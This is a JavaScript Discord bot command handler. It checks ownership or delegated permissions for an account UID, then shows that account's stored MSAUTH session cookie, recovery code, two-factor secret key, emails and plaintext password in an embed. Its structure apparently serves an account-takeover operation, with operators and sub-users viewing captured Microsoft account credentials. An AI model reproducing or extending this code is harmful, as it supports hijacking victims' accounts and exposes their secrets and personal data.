const { EmbedBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const isOwner = require("../../../db/isOwner");

module.exports = {
    name: "status",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            let uid = interaction.customId.split("|")[1];
            if (!uid) {
                return interaction.reply({
                    content: "Invalid UID.",
                    ephemeral: true,
                });
            }

            const isUserOwner = await isOwner(interaction.user.id);
            const isBotOwner = client.username && client.username === interaction.user.id;
            let hasAccess = isUserOwner || isBotOwner;

            if (!hasAccess) {
                const ownRows = await queryParams("SELECT 1 FROM accountsbyuser WHERE uid = ? AND user_id = ?", [uid, interaction.user.id]);
                if (ownRows && ownRows.length > 0) {
                    hasAccess = true;
                } else if (client.username) {
                    const childPerm = await queryParams("SELECT viewaccounts, admin FROM users WHERE user_id = ? AND child = ?", [client.username, interaction.user.id]);
                    if (childPerm && childPerm.length > 0 && (childPerm[0].viewaccounts === 1 || childPerm[0].admin === 1)) {
                        const botOwnRows = await queryParams("SELECT 1 FROM accountsbyuser WHERE uid = ? AND user_id = ?", [uid, client.username]);
                        if (botOwnRows && botOwnRows.length > 0) hasAccess = true;
                    }
                }
            }

            if (!hasAccess) {
                return interaction.reply({
                    content: "You do not have permission to view the status of this account.",
                    ephemeral: true,
                });
            }

            const results = await queryParams("SELECT * FROM status WHERE uid = ?", [uid]);
            if (!results || results.length === 0) {
                return interaction.reply({
                    content: `No status found for UID: ${uid}`,
                    ephemeral: true,
                });
            }
            const statusData = results[0];

            const emptyBox = '``` ```';

            const embed = new EmbedBuilder()
                .setTitle(`Secure status for UID \`\`${uid}\`\``)
                .addFields(
                    { name: 'MSAUTH Cookie', value: statusData.msauth ? `\`\`\`${statusData.msauth}\`\`\`` : emptyBox, inline: false },
                    { name: 'Username', value: statusData.username ? `\`\`\`${statusData.username}\`\`\`` : emptyBox, inline: false },
                    { name: 'Recovery Code', value: statusData.recoverycode ? `\`\`\`${statusData.recoverycode}\`\`\`` : emptyBox, inline: false },
                    { name: 'Secret Key', value: statusData.secretkey ? `\`\`\`${statusData.secretkey}\`\`\`` : emptyBox, inline: false },
                    { name: 'Primary Email', value: statusData.email ? `\`\`\`${statusData.email}\`\`\`` : emptyBox, inline: true },
                    { name: 'Security Email', value: statusData.secemail ? `\`\`\`${statusData.secemail}\`\`\`` : emptyBox, inline: true },
                    { name: 'Password', value: statusData.password ? `\`\`\`${statusData.password}\`\`\`` : emptyBox, inline: false }
                )
                .setColor('#b2c7e0')
                .setTimestamp();

            await interaction.reply({
                embeds: [embed],
                ephemeral: true,
            });
        } catch (error) {
            console.error('Error fetching status:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: 'An error occurred while fetching the status.',
                    ephemeral: true,
                }).catch(() => {});
            }
        }
    },
};
